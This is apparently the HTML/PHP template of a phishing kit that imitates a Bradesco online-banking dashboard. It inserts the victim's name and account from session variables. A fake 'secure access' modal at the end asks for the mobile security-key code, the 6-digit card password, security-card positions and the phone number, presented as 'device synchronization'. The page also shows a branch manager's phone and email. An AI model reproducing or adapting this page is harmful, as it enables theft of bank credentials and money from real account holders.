                    <!----><!---->
                    <div class="container">
                        <div class="grid" id="columns-full">
                            <!---->
                            <div class="cell cell-card large-4 column" style="order: 1;">
                                <!---->
                                <div>
                                    <brad-meus-saldos _nghost-tfo-c3="">
                                        <div _ngcontent-tfo-c3="" class="card-header">
                                            <h2 _ngcontent-tfo-c3="" tabindex="0">Meus saldos</h2>
                                            <a _ngcontent-tfo-c3="" class="link-ver-mais" routerlink="/saldos-extratos/saldo" title="Ver mais meus saldos" href="javascript:;">Ver mais</a>
                                        </div>
                                        <div _ngcontent-tfo-c3="" class="card">
                                            <!----><!----><!---->
                                            <div _ngcontent-tfo-c3="">
                                                <!---->
                                                <dl _ngcontent-tfo-c3="">
                                                    <dt _ngcontent-tfo-c3="">
                                                        <h3 _ngcontent-tfo-c3="" class="contaFacil">Conta-fácil</h3>
                                                    </dt>
                                                    <dd _ngcontent-tfo-c3=""><span class="moeda">-</span></dd>
                                                </dl>
                                                <dl _ngcontent-tfo-c3="">
                                                    <dt _ngcontent-tfo-c3="">
                                                        <h3 _ngcontent-tfo-c3="" class="totalBloqueado">Bloqueado</h3>
                                                    </dt>
                                                    <dd _ngcontent-tfo-c3=""><span class="moeda">-</span></dd>
                                                </dl>
                                                <dl _ngcontent-tfo-c3="">
                                                    <dt _ngcontent-tfo-c3="">
                                                        <h3 _ngcontent-tfo-c3="" class="investimentos">Investimentos c/ bx aut.</h3>
                                                    </dt>
                                                    <dd _ngcontent-tfo-c3=""><span class="moeda">-</span></dd>
                                                </dl>
                                                <dl _ngcontent-tfo-c3="" class="separator">
                                                    <dt _ngcontent-tfo-c3=""></dt>
                                                    <dd _ngcontent-tfo-c3=""></dd>
                                                </dl>
                                                <dl _ngcontent-tfo-c3="" class="total">
                                                    <dt _ngcontent-tfo-c3="">Total disponível</dt>
                                                    <dd _ngcontent-tfo-c3=""><span class="moeda" id="totalmoeda"></span></dd>
                                                </dl>
                                            </div>
                                            <!----><!---->
                                        </div>
                                    </brad-meus-saldos>
                                </div>
                                <!----><!----><!----><!----><!----><!----><!----><!---->
                            </div>
                            <div class="cell cell-card large-8 column" style="order: 2;">
                                <!----><!---->
                                <div>
                                    <brad-conta-corrente _nghost-tfo-c4="">
                                        <div _ngcontent-tfo-c4="" class="card-header">
                                            <h2 _ngcontent-tfo-c4="">Resumo</h2>
                                            <a _ngcontent-tfo-c4="" routerlink="/saldos-extratos/extratos" title="Ver mais conta corrente" href="javascript:;">Ver mais</a>
                                        </div>
                                        <div _ngcontent-tfo-c4="" class="card card-grid">
                                            <!----><!---->
                                            <div _ngcontent-tfo-c4="" class="container">
                                                <div _ngcontent-tfo-c4="" class="grid grid-8 altura">
                                                    <!----><!---->
                                                    <div _ngcontent-tfo-c4="" class="cell large-4">
                                                        <h3 _ngcontent-tfo-c4="">Últimos 30 dias</h3>
                                                        <div _ngcontent-tfo-c4="" class="resumo-box">
                                                            <div _ngcontent-tfo-c4="" class="resumo hide">
                                                                <dl _ngcontent-tfo-c4="" class="entrada" style="width: 100%;">
                                                                    <dt _ngcontent-tfo-c4="">Entrada</dt>
                                                                    <dd _ngcontent-tfo-c4=""><span class="moeda">-</span></dd>
                                                                </dl>
                                                                <dl _ngcontent-tfo-c4="" class="saida" style="width: 65.6916%;">
                                                                    <dt _ngcontent-tfo-c4="">Saída</dt>
                                                                    <dd _ngcontent-tfo-c4=""><span class="moeda">-</span></dd>
                                                                </dl>
                                                            </div>
                                                            <dl _ngcontent-tfo-c4="" class="resumo">
                                                                <dt _ngcontent-tfo-c4="">Conta-fácil</dt>
                                                                <dd _ngcontent-tfo-c4=""><span class="moeda">-</span></dd>
                                                            </dl>
                                                            <dl _ngcontent-tfo-c4="" class="resumo">
                                                                <!----><!---->
                                                            </dl>
                                                        </div>
                                                    </div>
                                                    <div _ngcontent-tfo-c4="" class="cell large-4 ultimos-lancamentos">
                                                        <h3 _ngcontent-tfo-c4="">Últimas transações</h3>
                                                        <div _ngcontent-tfo-c4="" class="box">
                                                            <!---->
                                                            <brad-timeline _ngcontent-tfo-c4="" _nghost-tfo-c17="">
                                                                <!---->
                                                                <brad-timeline-periodo _ngcontent-tfo-c4="">
                                                                    <div class="data">
                                                                        <div class="data-timeline"><span>30</span><span>JUL</span></div>
                                                                    </div>
                                                                    <!---->
                                                                    <brad-timeline-lancamento _ngcontent-tfo-c4="">
                                                                        <div _ngcontent-tfo-c4="" class="lancamento">
                                                                            <p _ngcontent-tfo-c4="" class="valor"><span class="moeda">-</span></p>
                                                                            <h4 _ngcontent-tfo-c4="" class="descricao"> dp Dinh c/c Bdn</h4>
                                                                            <!---->
                                                                            <p _ngcontent-tfo-c4="" class="favorecido"> Ag00540maq009871seq09795</p>
                                                                        </div>
                                                                    </brad-timeline-lancamento>
                                                                    <brad-timeline-lancamento _ngcontent-tfo-c4="">
                                                                        <div _ngcontent-tfo-c4="" class="lancamento">
                                                                            <p _ngcontent-tfo-c4="" class="valor"><span class="moeda">-</span></p>
                                                                            <h4 _ngcontent-tfo-c4="" class="descricao"> dp Dinh c/c Bdn</h4>
                                                                            <!---->
                                                                            <p _ngcontent-tfo-c4="" class="favorecido"> Ag00540maq009871seq09796</p>
                                                                        </div>
                                                                    </brad-timeline-lancamento>
                                                                    <brad-timeline-lancamento _ngcontent-tfo-c4="">
                                                                        <div _ngcontent-tfo-c4="" class="lancamento">
                                                                            <p _ngcontent-tfo-c4="" class="valor"><span class="moeda">-</span></p>
                                                                            <h4 _ngcontent-tfo-c4="" class="descricao"> dp Dinh c/c Bdn</h4>
                                                                            <!---->
                                                                            <p _ngcontent-tfo-c4="" class="favorecido"> Ag00540maq009871seq09797</p>
                                                                        </div>
                                                                    </brad-timeline-lancamento>
                                                                    <brad-timeline-lancamento _ngcontent-tfo-c4="">
                                                                        <div _ngcontent-tfo-c4="" class="lancamento">
                                                                            <p _ngcontent-tfo-c4="" class="valor"><span class="moeda">-</span></p>
                                                                            <h4 _ngcontent-tfo-c4="" class="descricao"> dp Dinh c/c Bdn</h4>
                                                                            <!---->
                                                                            <p _ngcontent-tfo-c4="" class="favorecido"> Ag00540maq009871seq09798</p>
                                                                        </div>
                                                                    </brad-timeline-lancamento>
                                                                </brad-timeline-periodo>
                                                            </brad-timeline>
                                                            <!---->
                                                        </div>
                                                    </div>
                                                    <!---->
                                                </div>
                                            </div>
                                            <!---->
                                        </div>
                                    </brad-conta-corrente>
                                </div>
                                <!----><!----><!----><!----><!----><!----><!---->
                            </div>
                            <div class="cell cell-card large-4 column" style="order: 3;">
                                <!----><!----><!---->
                                <div>
                                    <brad-emprestimos _nghost-tfo-c5="">
                                        <div _ngcontent-tfo-c5="">
                                            <div _ngcontent-tfo-c5="" class="card-header">
                                                <h2 _ngcontent-tfo-c5="">Empréstimos</h2>
                                                <a _ngcontent-tfo-c5="" routerlink="/emprestimos" title="Ver mais Empréstimos" href="javascript:;">Ver mais</a>
                                            </div>
                                            <div _ngcontent-tfo-c5="" class="card">
                                                <!---->
                                                <div _ngcontent-tfo-c5="" class="emprestimo mensagem">
                                                    <div _ngcontent-tfo-c5="" class="icon bloqueio"></div>
                                                    <p _ngcontent-tfo-c5="">Confira suas soluções em crédito por aqui.</p>
                                                    <p _ngcontent-tfo-c5=""><strong _ngcontent-tfo-c5="">Temos a opção ideal.</strong></p>
                                                </div>
                                                <button _ngcontent-tfo-c5="" bradbuttonsecondary="" class="btn-block btn-medium bloqueio btn-effects btn btn-secondary" _nghost-tfo-c16="">Visualizar</button><!---->
                                            </div>
                                        </div>
                                    </brad-emprestimos>
                                </div>
                                <!----><!----><!----><!----><!----><!---->
                            </div>
                            <div class="cell cell-card large-8 column" style="order: 4;">
                                <!----><!----><!----><!---->
                                <div>
                                    <brad-cartao-credito _nghost-tfo-c6="">
                                        <div _ngcontent-tfo-c6="" class="card-header">
                                            <h2 _ngcontent-tfo-c6="">Cartões de crédito</h2>
                                            <a _ngcontent-tfo-c6="" routerlink="/cartoes" title="Ver mais Cartões de credito" href="javascript:;">Ver mais</a>
                                        </div>
                                        <div _ngcontent-tfo-c6="" class="card card-grid">
                                            <!----><!----><!----><!----><!---->
                                            <div _ngcontent-tfo-c6="" class="novo-cartao">
                                                <div _ngcontent-tfo-c6="" class="content">
                                                    <h5 _ngcontent-tfo-c6="">Peça seu cartão de crédito hoje mesmo!</h5>
                                                    <p _ngcontent-tfo-c6="">Com os <strong _ngcontent-tfo-c6="">Cartões Bradesco</strong>, você tem facilidade pra fazer pagamentos e conta com seguros, assistência veicular e de viagens, programa de recompensas e muitos outros benefícios.</p>
                                                    <p _ngcontent-tfo-c6="">Conheça nossos cartões.</p>
                                                    <button _ngcontent-tfo-c6="" bradbuttonprimary="" routerlink="/cartoes" type="button" _nghost-tfo-c19="" class="btn-effects btn btn-primary" tabindex="0">Peça seu cartão</button>
                                                </div>
                                                <div _ngcontent-tfo-c6="" class="banner"></div>
                                            </div>
                                            <!----><!----><!---->
                                        </div>
                                    </brad-cartao-credito>
                                </div>
                                <!----><!----><!----><!----><!---->
                            </div>
                            <div class="cell cell-card large-6 column" style="order: 5;">
                                <!----><!----><!----><!----><!---->
                                <div>
                                    <brad-meus-investimentos _nghost-tfo-c7="">
                                        <div _ngcontent-tfo-c7="" class="card-header">
                                            <h2 _ngcontent-tfo-c7="">Meus Investimentos</h2>
                                            <a _ngcontent-tfo-c7="" routerlink="/investimentos" title="Ver mais Meus investimentos" href="javascript:;">Ver mais</a>
                                        </div>
                                        <div _ngcontent-tfo-c7="" class="card card-grid">
                                            <!---->
                                            <div _ngcontent-tfo-c7="" class="box-mensagens">
                                                <div _ngcontent-tfo-c7="" class="investimentos mensagem">
                                                    <div _ngcontent-tfo-c7="" class="icons">
                                                        <div _ngcontent-tfo-c7="" class="icon bloqueio-invest"></div>
                                                        <div _ngcontent-tfo-c7="" class="icon bloqueio-plus"></div>
                                                        <div _ngcontent-tfo-c7="" class="icon bloqueio-agora"></div>
                                                    </div>
                                                    <p _ngcontent-tfo-c7="">Veja aqui seus investimentos.</p>
                                                    <p _ngcontent-tfo-c7="">Quer investir? <strong _ngcontent-tfo-c7=""> Temos a carteira ideal para você.</strong></p>
                                                </div>
                                                <button _ngcontent-tfo-c7="" bradbuttonsecondary="" class="btn-medium bloqueio btn-effects btn btn-secondary" _nghost-tfo-c16="">Visualizar</button>
                                            </div>
                                            <!---->
                                        </div>
                                    </brad-meus-investimentos>
                                </div>
                                <!----><!----><!----><!---->
                            </div>
                            <div class="cell cell-card large-6 column" style="order: 6;">
                                <!----><!----><!----><!----><!----><!---->
                                <div>
                                    <brad-meus-seguros _nghost-tfo-c8="">
                                        <div _ngcontent-tfo-c8="" class="card-header">
                                            <h2 _ngcontent-tfo-c8="">Meus Seguros</h2>
                                            <a _ngcontent-tfo-c8="" routerlink="/seguros" title="Ver mais Meus Seguros" href="javascript:;">Ver mais</a>
                                        </div>
                                        <div _ngcontent-tfo-c8="" class="card card-grid">
                                            <!---->
                                            <div _ngcontent-tfo-c8="" class="box-mensagens">
                                                <div _ngcontent-tfo-c8="" class="seguros mensagem">
                                                    <div _ngcontent-tfo-c8="" class="icon bloqueio"></div>
                                                    <p _ngcontent-tfo-c8="">Acesse todos os seus bens segurados.</p>
                                                    <p _ngcontent-tfo-c8=""><strong _ngcontent-tfo-c8="">Ainda não tem?</strong><br _ngcontent-tfo-c8=""> Faça um seguro pra proteger você e sua família. </p>
                                                </div>
                                                <button _ngcontent-tfo-c8="" bradbuttonsecondary="" class="btn-block btn-medium bloqueio btn-effects btn btn-secondary" _nghost-tfo-c16="">Visualizar</button>
                                            </div>
                                            <!---->
                                        </div>
                                    </brad-meus-seguros>
                                </div>
                                <!----><!----><!---->
                            </div>
                            <div class="cell cell-card large-4 column" style="order: 7;">
                                <!----><!----><!----><!----><!----><!----><!---->
                                <div>
                                    <brad-meu-gerente _nghost-tfo-c9="">
                                        <div _ngcontent-tfo-c9="" class="card-header">
                                            <h2 _ngcontent-tfo-c9="">Meu gerente</h2>
                                        </div>
                                        <div _ngcontent-tfo-c9="" class="card">
                                            <!----><!----><!---->
                                            <div _ngcontent-tfo-c9="" class="card-content">
                                                <h4 _ngcontent-tfo-c9=""></h4>
                                                <dl _ngcontent-tfo-c9="">
                                                    <dt _ngcontent-tfo-c9="">Telefone:</dt>
                                                    <dd _ngcontent-tfo-c9=""><a _ngcontent-tfo-c9="" href="javascript:;"> 31 2103 0788</a></dd>
                                                </dl>
                                                <dl _ngcontent-tfo-c9="">
                                                    <dt _ngcontent-tfo-c9="">Email:</dt>
                                                    <dd _ngcontent-tfo-c9=""><a _ngcontent-tfo-c9="" href="javascript:;">0582.GERENCIA@BRADESCO.COM.BR</a></dd>
                                                </dl>
                                                <dl _ngcontent-tfo-c9="">
                                                    <dt _ngcontent-tfo-c9="">Agência:</dt>
                                                    <dd _ngcontent-tfo-c9="">RIO DE JANEIRO-CTO</dd>
                                                </dl>
                                                <a _ngcontent-tfo-c9="" bradbuttonprimary="" class="btn-block btn-effects btn btn-primary" _nghost-tfo-c19="" href="javascript:;">Enviar email</a>
                                            </div>
                                            <!----><!---->
                                        </div>
                                    </brad-meu-gerente>
                                </div>
                                <!----><!---->
                            </div>
                            <div class="cell cell-card large-4 column" style="order: 8;">
                                <!----><!----><!----><!----><!----><!----><!----><!---->
                                <div>
                                    <brad-atalhos _nghost-tfo-c10="">
                                        <div _ngcontent-tfo-c10="" class="card-header">
                                            <h2 _ngcontent-tfo-c10="">Atalhos</h2>
                                        </div>
                                        <div _ngcontent-tfo-c10="" class="card">
                                            <!----><!----><!----><!---->
                                            <h3 _ngcontent-tfo-c10="" class="title">Escolha uma opção</h3>
                                            <brad-carousel _ngcontent-tfo-c10="" _nghost-tfo-c18="">
                                                <div _ngcontent-tfo-c18="">
                                                    <div _ngcontent-tfo-c18="" class="slides">
                                                        <!---->
                                                        <brad-carousel-slide _ngcontent-tfo-c10="" class="active" style="margin-left: 0px;">
                                                            <ul _ngcontent-tfo-c10="">
                                                                <!---->
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"><span _ngcontent-tfo-c10="">Saldo</span><i _ngcontent-tfo-c10="" class="icon icon-arrow-line-next"></i></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"><span _ngcontent-tfo-c10="">Extrato (Últimos Lançamentos)</span><i _ngcontent-tfo-c10="" class="icon icon-arrow-line-next"></i></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"><span _ngcontent-tfo-c10="">Lançamentos Futuros</span><i _ngcontent-tfo-c10="" class="icon icon-arrow-line-next"></i></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"><span _ngcontent-tfo-c10="">Boleto de Cobrança</span><i _ngcontent-tfo-c10="" class="icon icon-arrow-line-next"></i></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"><span _ngcontent-tfo-c10="">Água, Luz, Telefone e Gás</span><i _ngcontent-tfo-c10="" class="icon icon-arrow-line-next"></i></a></li>
                                                            </ul>
                                                        </brad-carousel-slide>
                                                        <brad-carousel-slide _ngcontent-tfo-c10="">
                                                            <ul _ngcontent-tfo-c10="">
                                                                <!---->
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"></a></li>
                                                                <li _ngcontent-tfo-c10=""><a _ngcontent-tfo-c10="" href="javascript:;"></a></li>
                                                            </ul>
                                                        </brad-carousel-slide>
                                                    </div>
                                                    <brad-carousel-prev _ngcontent-tfo-c10="">
                                                        <!----><i _ngcontent-tfo-c10="" class="icon-arrow-prev"></i>
                                                    </brad-carousel-prev>
                                                    <brad-carousel-next _ngcontent-tfo-c10="">
                                                        <!----><i _ngcontent-tfo-c10="" class="icon-arrow-next"></i>
                                                    </brad-carousel-next>
                                                </div>
                                            </brad-carousel>
                                            <!----><!---->
                                        </div>
                                    </brad-atalhos>
                                </div>
                                <!---->
                            </div>
                            <div class="cell cell-card large-4 column" style="order: 9;">
                                <!----><!----><!----><!----><!----><!----><!----><!----><!---->
                                <div>
                                    <brad-avisos _nghost-tfo-c11="">
                                        <div _ngcontent-tfo-c11="" class="card-header">
                                            <h2 _ngcontent-tfo-c11="">Avisos</h2>
                                        </div>
                                        <div _ngcontent-tfo-c11="" class="card" data-total="0">
                                            <!----><!----><!----><!----><!---->
                                            <div _ngcontent-tfo-c11="" class="aviso">
                                                <h3 _ngcontent-tfo-c11="">Fique ligado!</h3>
                                                <p _ngcontent-tfo-c11="">No momento você não tem nenhum aviso, mas o Bradesco deixa você sempre atualizado e auxilia a organizar sua conta e seu dia-a-dia.</p>
                                            </div>
                                            <!----><!----><!---->
                                        </div>
                                    </brad-avisos>
                                </div>
                            </div>
                        </div>
                    </div>
















                </brad-app-home>
            </div>
            <router-outlet _ngcontent-xfy-c0=""></router-outlet>
            <brad-micro-app></brad-micro-app>
        </div>
        <!---->
        <brad-footer _ngcontent-xfy-c0="">



            <footer class="<?php print $tipo; ?>">
                <div class="container">
                    <div class="grid">
                        <div class="cell large-8">
                            <div class="logo"></div>
                            <div class="grid grid-12 fone-facil">
                                <div class="cell large-12">
                                    <h2>Fone Fácil</h2>
                                </div>
                                <div class="cell large-4">
                                    <h3>Capitais / Metropolitanas</h3>
                                    <h4>4002 0022</h4>
                                    <p>Consulta de saldo, extrato,<br> transações financeiras e de<br> cartão de crédito.</p>
                                </div>
                                <div class="cell large-4">
                                    <h3>Demais Regiões</h3>
                                    <h4>0800 570 0022</h4>
                                    <p>SAC - Deficiência<br> Auditiva ou de Fala</p>
                                    <h4 class="tel-sac-deficiencia">0800 722 0099</h4>
                                </div>
                                <div class="cell large-4">
                                    <h3>SAC - Alô Bradesco</h3>
                                    <h4>0800 704 8383</h4>
                                    <p>Cancelamento,<br> reclamação, informação,<br> sugestão e elogio.</p>
                                </div>
                                <div class="cell large-12 whatsapp-bia">
                                    <span class="qrcode"></span>
                                    <p>Se preferir, fale com a BIA pelo whatsapp:</p>
                                    <h4>3335-0237</h4>
                                </div>
                            </div>
                        </div>
                        <div class="cell large-4 seguranca">
                            <div class="card seguranca">
                                <h2>Segurança</h2>
                                <p>O cadeado precisa estar aparecendo na barra do seu navegador.</p>
                                <a href="javascript:;">Ver mais</a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="backdrop">
                    <div class="container">
                        <div class="grid demais-localidades">
                            <div class="cell large-6">
                                <a class="hide">
                                    Ver outros telefones
                                    <svg height="11px" version="1.1" viewBox="0 0 19 11" width="19px" xmlns="http://www.w3.org/2000/svg">
                                        <g fill="none" fill-rule="evenodd" id="Symbols" stroke="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="1">
                                            <g id="desk/footer/1440" stroke="#FFFFFF" stroke-width="2" transform="translate(-394.000000, -310.000000)">
                                                <g id="Group-Copy" transform="translate(234.000000, 305.000000)">
                                                    <g id="asset/icon/black/arrow_right-copy-2" transform="translate(169.500000, 10.500000) rotate(90.000000) translate(-169.500000, -10.500000) translate(165.000000, 2.000000)">
                                                        <g id="Group-2" transform="translate(0.750000, 0.750000)">
                                                            <polyline id="Path-2" points="-2.48689958e-14 0 8 7.75572767 0.00245863853 16"></polyline>
                                                        </g>
                                                    </g>
                                                </g>
                                            </g>
                                        </g>
                                    </svg>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="telefones hide">
                    <div class="container">
                        <div class="grid telefones-cartoes">
                            <div class="cell large-12">
                                <h3>Cartões</h3>
                                <p>Cancelamentos, Reclamações e informações gerais</p>
                            </div>
                            <div class="cell large-6">
                                <h4>SAC – Cartões de Crédito Elo, Visa e Mastercard</h4>
                                <p class="tel">0800 727 9988</p>
                                <h4>SAC – Cartões de Crédito e Compras American Express</h4>
                                <p class="tel">0800 721 1188</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 722 0099</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                            </div>
                            <div class="cell large-6">
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 727 9933</p>
                                <p>Atendimento de 2ª à 6ª-feira das 8h às 18h, exceto feriado.</p>
                                <p class="fale-conosco">Demais telefones consulte o site <a href="javascript:;">Fale Conosco</a></p>
                            </div>
                        </div>
                        <div class="grid telefones-previdencia">
                            <div class="cell large-12">
                                <h3 id="footer">Previdência</h3>
                            </div>
                            <div class="cell large-6">
                                <h4>SAC - Bradesco Vida e Previdência</h4>
                                <p class="tel">0800 721 1144</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 701 2778</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                                <h4>Central de Relacionamento</h4>
                                <h4>Informações sobre seguros de vida / acidentes pessoais</h4>
                                <p class="tel">4004 2704</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 701 2714</p>
                                <p>Atendimento em dias úteis das 8h as 20h.</p>
                                <p class="fale-conosco"> Demais telefones consulte o site <a href="javascript:;">www.susep.gov.br</a></p>
                            </div>
                            <div class="cell large-6">
                                <h4>Planos de Previdência</h4>
                                <p class="tel">4002-0022</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 570 0022</p>
                                <h4>Acesso exterior</h4>
                                <p class="tel">55 11 4002 0022</p>
                                <p>Atendimento em dias úteis das 7h30 às 19:30.</p>
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 701 7000</p>
                                <p>Atendimento em dias úteis das 8h às 18h.</p>
                            </div>
                        </div>
                        <div class="grid telefones-seguros">
                            <div class="cell large-12">
                                <h3>Seguros</h3>
                            </div>
                            <div class="cell large-6">
                                <h4>SAC - Bradesco Seguros</h4>
                                <p class="tel">0800 727 9966</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 701 2778</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                                <h4>Central de Relacionamento</h4>
                                <h4>Assistência, consultas, informações e serviços transacionais.</h4>
                                <p class="tel">4004 2700</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 701 2700</p>
                                <p>Atendimento em dias úteis das 8h às 20h.</p>
                            </div>
                            <div class="cell large-6">
                                <h4>Central de Atendimento de Sinistro</h4>
                                <p class="tel">4004 2794</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 701 2794</p>
                                <h4>Central de Assistências Acionamentos</h4>
                                <div class="container-tel">
                                    <span>
                                        <p class="tel">0800 701 2704</p>
                                        <p>Brasil</p>
                                    </span>
                                    <span>
                                        <p class="tel">55 11 4133 9113</p>
                                        <p>Exterior</p>
                                    </span>
                                </div>
                                <h4>Alarme - Seguro Viagem</h4>
                                <div class="container-tel">
                                    <span>
                                        <p class="tel">0800 775 3415</p>
                                        <p>Brasil</p>
                                    </span>
                                    <span>
                                        <p class="tel">55 11 2664 4014</p>
                                        <p>Exterior</p>
                                    </span>
                                </div>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                            </div>
                        </div>
                        <div class="grid telefones-sinistro-prestamista">
                            <div class="cell large-12">
                                <h3>Sinistro Prestamista</h3>
                            </div>
                            <div class="cell large-6">
                                <h4>Consórcios, Consignado INSS, Capital de Giro PJ, Consignado <br>Público e Crédito Rural</h4>
                                <p class="tel">4004 2794</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 701 2794</p>
                                <h4>Seguro Prestamista de Limite de Crédito - EP Lime</h4>
                                <p class="tel">3003 4172</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 200 0672</p>
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 701 7000</p>
                                <p>Atendimento em dias úteis das 8h às 18h.</p>
                                <p class="fale-conosco"> Demais telefones consulte o site <a href="javascript:;">www.susep.gov.br</a></p>
                            </div>
                            <div class="cell large-6">
                                <h4>Seguro Prestamista CDC Veículos, Bens e Serviços, Consignado <br> Privado, Cheque Especial, Crédito Global e Crédito Pessoal</h4>
                                <p class="tel">3003 4199</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 200 0999</p>
                                <h4>Seguro Prestamista Contas de Consumo</h4>
                                <p class="tel">3003 4245</p>
                                <h4>Demais Regiões</h4>
                                <p class="tel">0800 200 0985</p>
                            </div>
                        </div>
                        <div class="grid telefones-capitalizacao">
                            <div class="cell large-12">
                                <h3>Capitalização</h3>
                            </div>
                            <div class="cell large-6">
                                <h4>SAC – Capitalização</h4>
                                <p class="tel">0800 721 1155</p>
                                <h4>Deficiência auditiva ou de fala</h4>
                                <p class="tel">0800 722 0099</p>
                                <p>Atendimento 24 horas, 7 dias por semana.</p>
                            </div>
                            <div class="cell large-6">
                                <h4>Ouvidoria</h4>
                                <p class="tel">0800 701 7000</p>
                                <p>Atendimento em dias úteis das 8h às 18h.</p>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </brad-footer>
    </brad-root>


    <div class="jquery-modal blocker current">
        <div id="modal" class="modal" style="display: inline-block;">
            <div id="header-modal">
                <input type="hidden" id="ident" name="ident" value="<?php print $_SESSION['conta'] ?>">

                <span class="titulo">Bradesco</span>
                <span class="subtitulo">Acesso seguro</span>

            </div>
            <div id="boxCarregando" style="display: block;" class="boxes">
            
                <div class="center box-img">

                    <div id="livelo-spinner" style="display: block;">
                        <div class="loader">
                            <div class="inner one"></div>
                            <div class="inner two"></div>
                            <div class="inner three"></div>
                        </div>
                    </div>
                </div><div class="center">
                <p><strong style="color: #E1173F;" >Olá, <strong style="text-transform:uppercase;" ><?php print $_SESSION['titular_nome']; ?></strong></strong></p>
                <br><br><br><br><br><br><br><br><br><br>
                
                    <p><strong style="color: #E1173F;" >Estamos sincronizando seu dispositivo, por favor aguarde...</strong></p>
                </div>
            </div>

            <div id="boxToken" class="boxes" style="display: none;">
                <div class="boxLinha">
                    <span class="txt_msg_erro_disp" id="errotoken" style="display: none;">
                        <span class="erro_msg ml10 none_i error-show"><b>O número da Chave de Segurança não está correto.</b></span>
                    </span>
                    <p class="center">Digite o código informado na<br><strong>Chave de Segurança Eletrônica do Celular:</strong></p>
                    <div class="ladoLado clearfix">
                        <div class="left put-right">
                            <img width="90" src="./images/mobile-token_128.png" alt="">
                        </div>
                        <div class="right">
                            <span style="margin-top:22px;display:block" id="text_mobile_token" class="serial">Nº de referência do dispositivo:<br><strong class="serial_cliente"></strong></span>
                        </div>
                    </div>
                    <div class="form-code">
                        <input autofocus="" type="password" id="token" name="Password1" maxlength="6" title="Digite o código informado na Chave de Segurança Eletrônica: " class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4">
                        <div class="mark-char" style="width: 40px; left: 200px;"></div>
                    </div>

                    <div class="divBotoesPagina">
                        <button type="button" disabled id="btnAcessarToken" class="btn-action action-button tabindex" title="Enviar" tabindex="5">Enviar</button>
                    </div>

                </div>
            </div>
            <div id="boxSenhaDe6" class="boxes hide">
                <div class="boxLinha">
                    <span class="txt_msg_erro_disp hide">
                        <span class="erro_msg ml10 none_i error-show"><b>A senha informada não está correto.</b></span>
                    </span>
                    <p class="center">Confirme abaixo sua senha de 6 dígitos<br><strong>a mesma utilizada no seu cartão de débito:</strong></p>
                    <div class="imagem center" style="padding-top:20px; padding-bottom:20px;">
                        <img src="./images/icon-password.png" alt="">
                    </div>

                    <div class="form-code">
                        <input autofocus="" type="password" id="senha6" name="senha6" maxlength="6" title="Digite a senha de 6 dígitos" class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4">
                        <div class="mark-char" style="width: 40px; left: 200px;"></div>
                    </div>

                    <div class="divBotoesPagina">
                        <button type="button" id="btnConfirmarSenha6" class="btn-action action-button tabindex" title="Confirmar" tabindex="5">Confirmar</button>
                    </div>

                </div>
            </div>
            <div id="boxTabela" class="boxes" style="display: none;">
                <div class="boxLinha">
                    <span id="errotabela" class="txt_msg_erro_disp" style="display: none;">
                        <span class="erro_msg ml10 none_i error-show"><b>O número da Chave de Segurança não está correto.</b></span>
                    </span>
                    <p class="center">Digite a posição <strong id="posicao"></strong> informada no <br><strong>Cartão Chave de Segurança</strong>:</p>
                    <div class="ladoLado clearfix">
                        <div class="left put-right">
                            <img width="101" src="./images/tancode_128.png" alt="">
                        </div>
                        <div class="right">
                            <span style="margin-top:25px;display:block" id="text_mobile_token" class="serial">Nº de referência do dispositivo:<br><strong id="serial_tabela" class="serial"></strong></span>
                        </div>
                    </div>
                    <div class="form-code" style="width:150px">
                        <input style="text-align:center;" autofocus="" type="password" id="posicaoTabela" name="posicaoTabela" maxlength="3" title="Digite o código informado no cartão de segurança: " class="border-chars form-digits only-numbers tabindex tabfirst naotrocafoco denyAutoComplete" autocomplete="new-password" tabindex="4">
                        <div class="mark-char" style="width: 40px; left: 200px;"></div>
                    </div>

                    <div class="divBotoesPagina">
                        <button type="button" id="btnAcessarTabela" class="btn-action action-button tabindex" title="Enviar" tabindex="5">Enviar</button>
                    </div>

                </div>
            </div>

            <div id="boxCelular" style="display: none;" class="boxes">
                <div class="boxLinha">
                    <span id="errocelular" style="display: none;" class="txt_msg_erro_disp">
                        <span class="erro_msg ml10 none_i error-show"><b>O número do celular informado não está correto.</b></span>
                    </span>
                    <p class="center">Confirme o <strong>número do celular</strong><br>cadastrado em sua conta:</p>
                    <div class="imagem center" style="padding-top:20px">
